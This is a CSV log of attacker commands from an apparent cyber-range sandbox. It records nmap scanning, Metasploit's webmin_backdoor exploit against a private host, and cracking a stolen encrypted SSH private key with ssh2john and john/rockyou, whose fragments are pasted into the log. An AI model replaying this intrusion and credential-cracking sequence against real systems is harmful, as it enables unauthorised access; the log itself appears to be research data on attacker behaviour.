sandbox_id,cmd_type,cmd_name,cmd_arguments,hostname,ip,level,username,timestamp_str,relative_timestamp_str
671,bash-command,nano,private_key,attacker,10.1.135.83,38,kali,2022-05-04T11:06:31.996Z,1970-01-01T00:59:50.990Z
671,bash-command,nano,private_key,attacker,10.1.135.83,38,kali,2022-05-04T11:06:32.123Z,1970-01-01T00:59:51.117Z
671,bash-command,nano,private_key,attacker,10.1.135.83,38,kali,2022-05-04T11:06:32.270Z,1970-01-01T00:59:51.264Z
671,bash-command,ssh,eve@10.1.17.4,attacker,10.1.135.83,38,kali,2022-05-04T11:07:11.108Z,1970-01-01T01:00:30.102Z
671,bash-command,ssh,eve@10.1.17.4,attacker,10.1.135.83,38,kali,2022-05-04T11:07:11.353Z,1970-01-01T01:00:30.347Z
671,bash-command,ssh,eve@10.1.17.4,attacker,10.1.135.83,38,kali,2022-05-04T11:07:16.814Z,1970-01-01T01:00:35.808Z
671,bash-command,man,ssh,attacker,10.1.135.83,38,kali,2022-05-04T11:07:28.914Z,1970-01-01T01:00:47.908Z
671,bash-command,ssh,-i private_key eve@10.1.17.4,attacker,10.1.135.83,38,kali,2022-05-04T11:08:05.387Z,1970-01-01T01:01:24.381Z
671,bash-command,ssh,-i private_key eve@10.1.17.4,attacker,10.1.135.83,38,kali,2022-05-04T11:08:05.602Z,1970-01-01T01:01:24.596Z
671,bash-command,ssh,-i private_key eve@10.1.17.4,attacker,10.1.135.83,38,kali,2022-05-04T11:08:05.757Z,1970-01-01T01:01:24.751Z
671,bash-command,chmod,700 private_key,attacker,10.1.135.83,38,kali,2022-05-04T11:08:17.331Z,1970-01-01T01:01:36.325Z
671,bash-command,ssh,-i private_key eve@10.1.17.4,attacker,10.1.135.83,38,kali,2022-05-04T11:08:23.658Z,1970-01-01T01:01:42.652Z
671,bash-command,arping,--help,attacker,10.1.135.83,38,kali,2022-05-04T11:09:04.104Z,1970-01-01T01:02:23.098Z
671,bash-command,ls,NONE,attacker,10.1.135.83,38,kali,2022-05-04T11:09:08.907Z,1970-01-01T01:02:27.901Z
671,bash-command,ls,NONE,attacker,10.1.135.83,38,kali,2022-05-04T11:09:25.414Z,1970-01-01T01:02:44.408Z
671,bash-command,ls,NONE,attacker,10.1.135.83,38,kali,2022-05-04T11:09:26.944Z,1970-01-01T01:02:45.938Z
671,bash-command,ls,NONE,attacker,10.1.135.83,38,kali,2022-05-04T11:09:51.697Z,1970-01-01T01:03:10.691Z
671,bash-command,ls,NONE,attacker,10.1.135.83,38,kali,2022-05-04T11:11:25.023Z,1970-01-01T01:04:44.017Z
671,bash-command,ls,NONE,attacker,10.1.135.83,38,kali,2022-05-04T11:11:25.140Z,1970-01-01T01:04:44.134Z
671,bash-command,ls,NONE,attacker,10.1.135.83,38,kali,2022-05-04T11:11:25.267Z,1970-01-01T01:04:44.261Z
671,bash-command,locate,ssh2john.py,attacker,10.1.135.83,38,kali,2022-05-04T11:11:34.387Z,1970-01-01T01:04:53.381Z
671,bash-command,python,home/kali/ssh2john.py private_key > private_key.hash,attacker,10.1.135.83,38,kali,2022-05-04T11:11:57.369Z,1970-01-01T01:05:16.363Z
671,bash-command,python,/home/kali/ssh2john.py private_key > private_key.hash,attacker,10.1.135.83,38,kali,2022-05-04T11:12:08.633Z,1970-01-01T01:05:27.627Z
671,bash-command,python,/home/kali/ssh2john.py private_key > private_key.hash,attacker,10.1.135.83,38,kali,2022-05-04T11:12:10.674Z,1970-01-01T01:05:29.668Z
671,bash-command,python,/home/kali/ssh2john.py private_key > private_key.hash,attacker,10.1.135.83,38,kali,2022-05-04T11:12:10.829Z,1970-01-01T01:05:29.823Z
671,bash-command,ls,NONE,attacker,10.1.135.83,38,kali,2022-05-04T11:12:35.790Z,1970-01-01T01:05:54.784Z
671,bash-command,ls,NONE,attacker,10.1.135.83,38,kali,2022-05-04T11:12:37.441Z,1970-01-01T01:05:56.435Z
671,bash-command,john,private_key.hash -wordlist=/usr/share/wordlists,attacker,10.1.135.83,38,kali,2022-05-04T11:12:59.953Z,1970-01-01T01:06:18.947Z
671,bash-command,john,private_key.hash -wordlist=/usr/share/wordlists/rockyou.txt,attacker,10.1.135.83,38,kali,2022-05-04T11:13:06.904Z,1970-01-01T01:06:25.898Z
643,bash-command,ls,NONE,attacker,10.1.135.83,34,kali,2022-05-04T06:41:40.556Z,1970-01-01T00:04:06.902Z
643,bash-command,ssh2john.py,NONE,attacker,10.1.135.83,34,kali,2022-05-04T06:41:48.004Z,1970-01-01T00:04:14.350Z
643,bash-command,python,ssh2john.py,attacker,10.1.135.83,34,kali,2022-05-04T06:41:54.456Z,1970-01-01T00:04:20.802Z
643,bash-command,clear,NONE,attacker,10.1.135.83,34,kali,2022-05-04T06:41:59.445Z,1970-01-01T00:04:25.791Z
643,bash-command,nmap,-sL 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T06:43:32.345Z,1970-01-01T00:05:58.691Z
643,bash-command,nmap,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T06:43:56.625Z,1970-01-01T00:06:22.971Z
643,bash-command,nmap,-sV 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T06:45:46.022Z,1970-01-01T00:08:12.368Z
643,bash-command,nmap,-sV -p22 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T06:47:37.768Z,1970-01-01T00:10:04.114Z
643,bash-command,nmap,-sC -p22 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T06:50:05.802Z,1970-01-01T00:12:32.148Z
643,bash-command,nmap,-sC -p10000 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T06:50:29.009Z,1970-01-01T00:12:55.355Z
643,bash-command,ls,NONE,attacker,10.1.135.83,34,kali,2022-05-04T06:51:35.309Z,1970-01-01T00:14:01.655Z
643,bash-command,python,ssh2john.py,attacker,10.1.135.83,34,kali,2022-05-04T06:51:39.306Z,1970-01-01T00:14:05.652Z
643,bash-command,python,ssh2john.py 23:f3:2b:39:32:b5:b9:b1:14:43:d5:75:7e:50:53:22,attacker,10.1.135.83,34,kali,2022-05-04T06:52:06.568Z,1970-01-01T00:14:32.914Z
643,bash-command,nmap,-A 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T06:54:27.904Z,1970-01-01T00:16:54.250Z
643,bash-command,nmap,-A 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T06:54:46.358Z,1970-01-01T00:17:12.704Z
643,bash-command,nmap,-sV -p22 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T06:56:43.850Z,1970-01-01T00:19:10.196Z
643,bash-command,nmap,-sV 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T06:57:42.598Z,1970-01-01T00:20:08.944Z
643,bash-command,nmap,-sV 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T06:59:02.415Z,1970-01-01T00:21:28.761Z
643,msf-command,search,webmin,attacker,10.1.135.83,35,null,2022-05-04T07:04:54.047Z,1970-01-01T00:27:20.393Z
643,msf-command,info,0,attacker,10.1.135.83,35,null,2022-05-04T07:05:16.642Z,1970-01-01T00:27:42.988Z
643,msf-command,info,5,attacker,10.1.135.83,35,null,2022-05-04T07:06:38.681Z,1970-01-01T00:29:05.027Z
643,msf-command,Metasploit,NONE,attacker,10.1.135.83,36,null,2022-05-04T07:09:09.390Z,1970-01-01T00:31:35.736Z
643,msf-command,exit,NONE,attacker,10.1.135.83,36,null,2022-05-04T07:09:29.091Z,1970-01-01T00:31:55.437Z
643,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T07:09:29.168Z,1970-01-01T00:31:55.514Z
643,bash-command,Metasploit,NONE,attacker,10.1.135.83,36,kali,2022-05-04T07:09:42.780Z,1970-01-01T00:32:09.126Z
643,msf-command,exploits,NONE,attacker,10.1.135.83,36,null,2022-05-04T07:13:38.859Z,1970-01-01T00:36:05.205Z
643,msf-command,help,NONE,attacker,10.1.135.83,36,null,2022-05-04T07:13:46.933Z,1970-01-01T00:36:13.279Z
643,msf-command,search,help,attacker,10.1.135.83,36,null,2022-05-04T07:15:43.711Z,1970-01-01T00:38:10.057Z
643,msf-command,search,Webmin,attacker,10.1.135.83,36,null,2022-05-04T07:16:35.932Z,1970-01-01T00:39:02.278Z
643,msf-command,run,use exploit/linux/http/webmin_backdoor,attacker,10.1.135.83,36,null,2022-05-04T07:16:55.340Z,1970-01-01T00:39:21.686Z
643,msf-command,use,exploit/linux/http/webmin_backdoor,attacker,10.1.135.83,36,null,2022-05-04T07:17:24.676Z,1970-01-01T00:39:51.022Z
643,msf-command,connect,NONE,attacker,10.1.135.83,36,null,2022-05-04T07:17:38.014Z,1970-01-01T00:40:04.360Z
643,msf-command,connect,172.18.1.5 10000,attacker,10.1.135.83,36,null,2022-05-04T07:18:04.999Z,1970-01-01T00:40:31.345Z
643,msf-command,use,exploit/linux/http/webmin_backdoor,attacker,10.1.135.83,36,null,2022-05-04T07:21:02.255Z,1970-01-01T00:43:28.601Z
643,msf-command,exir,NONE,attacker,10.1.135.83,36,null,2022-05-04T07:21:05.654Z,1970-01-01T00:43:32Z
643,msf-command,exit,NONE,attacker,10.1.135.83,36,null,2022-05-04T07:21:06.900Z,1970-01-01T00:43:33.246Z
643,bash-command,msfconsole,Metasploit,attacker,10.1.135.83,36,kali,2022-05-04T07:21:06.998Z,1970-01-01T00:43:33.344Z
643,msf-command,use,exploit/linux/http/webmin_backdoor,attacker,10.1.135.83,36,null,2022-05-04T07:21:42.120Z,1970-01-01T00:44:08.466Z
643,msf-command,show,options,attacker,10.1.135.83,36,null,2022-05-04T07:22:06.171Z,1970-01-01T00:44:32.517Z
643,msf-command,set,RHOST 172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T07:23:08.228Z,1970-01-01T00:45:34.574Z
643,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,36,null,2022-05-04T07:23:49.884Z,1970-01-01T00:46:16.230Z
643,msf-command,EXPLOIT,NONE,attacker,10.1.135.83,36,null,2022-05-04T07:23:53.138Z,1970-01-01T00:46:19.484Z
643,msf-command,exploit,NONE,attacker,10.1.135.83,37,null,2022-05-04T07:30:01.025Z,1970-01-01T00:52:27.371Z
643,msf-command,exit,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:44:14.293Z,1970-01-01T01:06:40.639Z
643,bash-command,msfconsole,Metasploit,attacker,10.1.135.83,38,kali,2022-05-04T07:44:14.366Z,1970-01-01T01:06:40.712Z
643,msf-command,use,exploit/linux/http/webmin_backdoor,attacker,10.1.135.83,38,null,2022-05-04T07:44:37.767Z,1970-01-01T01:07:04.113Z
643,msf-command,set,RHOST 172.18.1.5,attacker,10.1.135.83,38,null,2022-05-04T07:44:42.041Z,1970-01-01T01:07:08.387Z
643,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,38,null,2022-05-04T07:44:47.430Z,1970-01-01T01:07:13.776Z
643,msf-command,exploit,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:49:42.739Z,1970-01-01T01:12:09.085Z
643,msf-command,-----BEGIN,RSA PRIVATE KEY-----,attacker,10.1.135.83,38,null,2022-05-04T07:50:05.732Z,1970-01-01T01:12:32.078Z
643,msf-command,Proc-Type:,4(comma)ENCRYPTED,attacker,10.1.135.83,38,null,2022-05-04T07:50:05.932Z,1970-01-01T01:12:32.278Z
643,bash-command,python3,ssh2john.py id_rsa > hash,attacker,10.1.135.83,38,kali,2022-05-04T07:51:47.216Z,1970-01-01T01:14:13.562Z
643,bash-command,john,--wordlist=/usr/share/wordlists/rockyou.txt hash,attacker,10.1.135.83,38,kali,2022-05-04T07:52:00.889Z,1970-01-01T01:14:27.235Z
643,bash-command,python3,ssh2john.py -----BEGIN RSA PRIVATE KEY----- > hash,attacker,10.1.135.83,38,kali,2022-05-04T07:53:10.968Z,1970-01-01T01:15:37.314Z
643,bash-command,python3,ssh2john.py -----BEGIN RSA PRIVATE KEY----- > hash,attacker,10.1.135.83,38,kali,2022-05-04T07:53:10.996Z,1970-01-01T01:15:37.342Z
643,bash-command,Proc-Type:,4(comma)ENCRYPTED,attacker,10.1.135.83,38,kali,2022-05-04T07:53:11.125Z,1970-01-01T01:15:37.471Z
643,bash-command,Proc-Type:,4(comma)ENCRYPTED,attacker,10.1.135.83,38,kali,2022-05-04T07:53:11.164Z,1970-01-01T01:15:37.510Z
643,bash-command,DEK-Info:,AES-128-CBC(comma)48A98AC639005A4158AA7B9CEEF483C4,attacker,10.1.135.83,38,kali,2022-05-04T07:53:11.303Z,1970-01-01T01:15:37.649Z
643,bash-command,DEK-Info:,AES-128-CBC(comma)48A98AC639005A4158AA7B9CEEF483C4,attacker,10.1.135.83,38,kali,2022-05-04T07:53:11.341Z,1970-01-01T01:15:37.687Z
643,bash-command,DEK-Info:,AES-128-CBC(comma)48A98AC639005A4158AA7B9CEEF483C4,attacker,10.1.135.83,38,kali,2022-05-04T07:53:11.386Z,1970-01-01T01:15:37.732Z
643,bash-command,DEK-Info:,AES-128-CBC(comma)48A98AC639005A4158AA7B9CEEF483C4,attacker,10.1.135.83,38,kali,2022-05-04T07:53:11.418Z,1970-01-01T01:15:37.764Z
643,bash-command,Ps9uCxB/vjzzEwZU+BjohF/sb/kaa+thfeYki9iFGqVQpHbPhdZU7JO2r...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:11.504Z,1970-01-01T01:15:37.850Z
643,bash-command,Ps9uCxB/vjzzEwZU+BjohF/sb/kaa+thfeYki9iFGqVQpHbPhdZU7JO2r...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:11.537Z,1970-01-01T01:15:37.883Z
643,bash-command,2OG1q9DAD07fQPpCmX5vqWAdmeaWq//2k3zRVsadFF3daPGjWs1f61j4/...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:11.614Z,1970-01-01T01:15:37.960Z
643,bash-command,2OG1q9DAD07fQPpCmX5vqWAdmeaWq//2k3zRVsadFF3daPGjWs1f61j4/...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:11.653Z,1970-01-01T01:15:37.999Z
643,bash-command,yeX8g98mtBLBas7bUFuo4jVroEUaoF0fpa0Up+mOAC3rY3tsprpfofQu+...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:11.846Z,1970-01-01T01:15:38.192Z
643,bash-command,yeX8g98mtBLBas7bUFuo4jVroEUaoF0fpa0Up+mOAC3rY3tsprpfofQu+...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:11.885Z,1970-01-01T01:15:38.231Z
643,bash-command,Bq2CuS5LcqbfVfl9737XeC+DNls/AmkLmYU/1NLKp1hWSpx0/dfJu725t...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:11.969Z,1970-01-01T01:15:38.315Z
643,bash-command,Bq2CuS5LcqbfVfl9737XeC+DNls/AmkLmYU/1NLKp1hWSpx0/dfJu725t...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:12.006Z,1970-01-01T01:15:38.352Z
643,bash-command,9lS9eEPebv4V8mUNU+bsh5YQbVrVmryO9BRLBl4ZK82SO7tnyObpWfsa2...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:12.198Z,1970-01-01T01:15:38.544Z
643,bash-command,9lS9eEPebv4V8mUNU+bsh5YQbVrVmryO9BRLBl4ZK82SO7tnyObpWfsa2...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:12.235Z,1970-01-01T01:15:38.581Z
643,bash-command,N/jFdUnWSkA2wEgzupDZmPU6jyJ/BosOxJVkih4oQB1s9BO+HzI7oA5sD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:12.317Z,1970-01-01T01:15:38.663Z
643,bash-command,N/jFdUnWSkA2wEgzupDZmPU6jyJ/BosOxJVkih4oQB1s9BO+HzI7oA5sD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:12.353Z,1970-01-01T01:15:38.699Z
643,bash-command,BdC2V8RnF8i8gwppc2eenbU/PIdDTu6M2LTO4aAM5wxwKXgkTdJuUxmNH...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:12.436Z,1970-01-01T01:15:38.782Z
643,bash-command,BdC2V8RnF8i8gwppc2eenbU/PIdDTu6M2LTO4aAM5wxwKXgkTdJuUxmNH...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:12.469Z,1970-01-01T01:15:38.815Z
643,bash-command,/DJyNP3xqCknFLIVTBwVSsHqnHSN6ZCl8BteFdRsf6kAj6qm1/cAfL73o...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:12.546Z,1970-01-01T01:15:38.892Z
643,bash-command,/DJyNP3xqCknFLIVTBwVSsHqnHSN6ZCl8BteFdRsf6kAj6qm1/cAfL73o...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:12.583Z,1970-01-01T01:15:38.929Z
643,bash-command,5PHI1jf+WoJVaRKQLzFfaMrY0rhU6TsQTYdm2QYcSszE1fhLdXGNKpath...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:12.779Z,1970-01-01T01:15:39.125Z
643,bash-command,5PHI1jf+WoJVaRKQLzFfaMrY0rhU6TsQTYdm2QYcSszE1fhLdXGNKpath...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:12.818Z,1970-01-01T01:15:39.164Z
643,bash-command,RPbgJfB0PuzwpzcKesh5j+AnjKQjZcG1vHnrgvDFnd5VNOOrTzdUnMA0D...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:13.011Z,1970-01-01T01:15:39.357Z
643,bash-command,RPbgJfB0PuzwpzcKesh5j+AnjKQjZcG1vHnrgvDFnd5VNOOrTzdUnMA0D...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:13.045Z,1970-01-01T01:15:39.391Z
643,bash-command,vkjUvPbdIkQlNuBL0FWZl/2vHf/xWWex4Q0plLf7lRWJsCDtiKflKHL/S...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:13.122Z,1970-01-01T01:15:39.468Z
643,bash-command,vkjUvPbdIkQlNuBL0FWZl/2vHf/xWWex4Q0plLf7lRWJsCDtiKflKHL/S...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:13.159Z,1970-01-01T01:15:39.505Z
643,bash-command,TwKMZJ4885lBJfN3AG9kj4azCLK6IcAuRoxTmAtYrntQWLtDCHyaCW6dZ...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:13.348Z,1970-01-01T01:15:39.694Z
643,bash-command,TwKMZJ4885lBJfN3AG9kj4azCLK6IcAuRoxTmAtYrntQWLtDCHyaCW6dZ...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:13.386Z,1970-01-01T01:15:39.732Z
643,bash-command,pghYqk7inYawVLDG9f5ej+1MYQNfScZYpQ/IEH2jfbRgQsXj7zgtS9ewQ...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:13.469Z,1970-01-01T01:15:39.815Z
643,bash-command,pghYqk7inYawVLDG9f5ej+1MYQNfScZYpQ/IEH2jfbRgQsXj7zgtS9ewQ...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:13.499Z,1970-01-01T01:15:39.845Z
643,bash-command,TC+mWTFkXW5YlN9Bu1uZ2CgYQJF0Dx1ns5x3IeF+U5z56KRqaKFJPfRQg...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:13.691Z,1970-01-01T01:15:40.037Z
643,bash-command,TC+mWTFkXW5YlN9Bu1uZ2CgYQJF0Dx1ns5x3IeF+U5z56KRqaKFJPfRQg...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:13.729Z,1970-01-01T01:15:40.075Z
643,bash-command,0v/8aKPlPwfmS28OtxtE96zQI3SAAy7AdwkBepz5Pk9iotqIQPk5fY68w...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:13.805Z,1970-01-01T01:15:40.151Z
643,bash-command,0v/8aKPlPwfmS28OtxtE96zQI3SAAy7AdwkBepz5Pk9iotqIQPk5fY68w...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:13.843Z,1970-01-01T01:15:40.189Z
643,bash-command,d712Dnn4OPYaqzMTyWz/dRiWcax9bFhNV+9Gp1OoA7hhBO5daLoul3EYx...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:13.919Z,1970-01-01T01:15:40.265Z
643,bash-command,d712Dnn4OPYaqzMTyWz/dRiWcax9bFhNV+9Gp1OoA7hhBO5daLoul3EYx...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:13.963Z,1970-01-01T01:15:40.309Z
643,bash-command,qJkjc4ljMYr9wvRRcWEhlvQV6LTk2FiYOY4tjRneLXMfsb2BUwSFDXDwD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:14.162Z,1970-01-01T01:15:40.508Z
643,bash-command,qJkjc4ljMYr9wvRRcWEhlvQV6LTk2FiYOY4tjRneLXMfsb2BUwSFDXDwD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:14.203Z,1970-01-01T01:15:40.549Z
643,bash-command,rk6oUkbp2aFy5SgMwdlm6tc5sHVHVOLTfeyv7AvRUOaGXbbrUBw1rxgsw...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:14.395Z,1970-01-01T01:15:40.741Z
643,bash-command,rk6oUkbp2aFy5SgMwdlm6tc5sHVHVOLTfeyv7AvRUOaGXbbrUBw1rxgsw...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:14.440Z,1970-01-01T01:15:40.786Z
643,bash-command,anC3ZW1EHY/nUmSq9myKG5rPdgFhqx7lPBb5eXSGcA+rFkxkQwbtROw73...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:14.509Z,1970-01-01T01:15:40.855Z
643,bash-command,anC3ZW1EHY/nUmSq9myKG5rPdgFhqx7lPBb5eXSGcA+rFkxkQwbtROw73...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:14.546Z,1970-01-01T01:15:40.892Z
643,bash-command,FKuYCbpmfnY0ZBxR9NVh/kRpv5VI013Mwqk2lcuJTc+mjlHOymyXAhY02...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:14.623Z,1970-01-01T01:15:40.969Z
643,bash-command,FKuYCbpmfnY0ZBxR9NVh/kRpv5VI013Mwqk2lcuJTc+mjlHOymyXAhY02...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:14.661Z,1970-01-01T01:15:41.007Z
643,bash-command,TleEMFlW9oXD56B21kVdPDP9McdLgC9//2pSh8sI5kJEsNd294g8ju/dD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:14.737Z,1970-01-01T01:15:41.083Z
643,bash-command,TleEMFlW9oXD56B21kVdPDP9McdLgC9//2pSh8sI5kJEsNd294g8ju/dD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:14.776Z,1970-01-01T01:15:41.122Z
643,bash-command,aqa9d+Nsbodr90LgBOFRdtxUeYihXLS2ZfXE5wYfTwX17ZIoFLuYamE6O...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:14.966Z,1970-01-01T01:15:41.312Z
643,bash-command,aqa9d+Nsbodr90LgBOFRdtxUeYihXLS2ZfXE5wYfTwX17ZIoFLuYamE6O...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.003Z,1970-01-01T01:15:41.349Z
643,bash-command,uSoF68eAZXd6R9bL03s9HQvGkSZv8zaFlmK4wRVI5frYMlU5gzD5E/e6I...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.081Z,1970-01-01T01:15:41.427Z
643,bash-command,uSoF68eAZXd6R9bL03s9HQvGkSZv8zaFlmK4wRVI5frYMlU5gzD5E/e6I...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.117Z,1970-01-01T01:15:41.463Z
643,bash-command,pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfI...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.195Z,1970-01-01T01:15:41.541Z
643,bash-command,pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfI...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.234Z,1970-01-01T01:15:41.580Z
643,bash-command,Q9Z2LPIWU200w5daHsXp/qukKdDn1CB4JinKvtLka3Q4i6EHj+Vp7bvhm...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.310Z,1970-01-01T01:15:41.656Z
643,bash-command,Q9Z2LPIWU200w5daHsXp/qukKdDn1CB4JinKvtLka3Q4i6EHj+Vp7bvhm...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.353Z,1970-01-01T01:15:41.699Z
643,bash-command,/BXnD+JMm+w9ZTRsHqrXKsAEyVhM99hWoFz2k1s+Q003y/7I/0XmPETD4...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.437Z,1970-01-01T01:15:41.783Z
643,bash-command,/BXnD+JMm+w9ZTRsHqrXKsAEyVhM99hWoFz2k1s+Q003y/7I/0XmPETD4...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.475Z,1970-01-01T01:15:41.821Z
643,bash-command,WzolChBDCjWIMZ/9j5JREtzWX3s7+k32TFws/jPKzXEB21M2Szn23pkoX...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.551Z,1970-01-01T01:15:41.897Z
643,bash-command,WzolChBDCjWIMZ/9j5JREtzWX3s7+k32TFws/jPKzXEB21M2Szn23pkoX...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.588Z,1970-01-01T01:15:41.934Z
643,bash-command,bTXmV+hQf+gS7PjVRthqPONau6on19uDDVXNeuVygP4T8H5v6kAurFVX1...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.787Z,1970-01-01T01:15:42.133Z
643,bash-command,bTXmV+hQf+gS7PjVRthqPONau6on19uDDVXNeuVygP4T8H5v6kAurFVX1...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.825Z,1970-01-01T01:15:42.171Z
643,bash-command,sCLJmNBb/7o7QR1Hhvo7NN1z85CJr9yxC6MqLbbcv91Mhb3w1Ce2eL+Qn...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.899Z,1970-01-01T01:15:42.245Z
643,bash-command,sCLJmNBb/7o7QR1Hhvo7NN1z85CJr9yxC6MqLbbcv91Mhb3w1Ce2eL+Qn...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:15.938Z,1970-01-01T01:15:42.284Z
643,bash-command,I0lvTSHTPFgvw00pV4bypACc28X+0YjRVRFOxqZxidw256pubOjRjIHIG...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:16.137Z,1970-01-01T01:15:42.483Z
643,bash-command,I0lvTSHTPFgvw00pV4bypACc28X+0YjRVRFOxqZxidw256pubOjRjIHIG...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:16.174Z,1970-01-01T01:15:42.520Z
643,bash-command,W3XiLqeGN7DLwY8X6RXfqafVQmJR6j3zB/PAoSVh25eTQwl2i1rgYzo0I...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:16.251Z,1970-01-01T01:15:42.597Z
643,bash-command,W3XiLqeGN7DLwY8X6RXfqafVQmJR6j3zB/PAoSVh25eTQwl2i1rgYzo0I...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:16.290Z,1970-01-01T01:15:42.636Z
